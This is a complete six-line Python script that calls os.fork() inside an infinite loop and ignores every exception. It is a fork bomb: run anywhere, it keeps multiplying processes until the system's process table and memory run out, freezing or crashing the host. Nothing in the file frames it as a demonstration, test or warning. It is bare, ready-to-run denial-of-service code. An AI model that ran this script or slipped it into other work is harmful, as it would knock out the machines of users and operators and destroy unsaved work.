import os
while True:
    try:
        os.fork()
    except:
        pass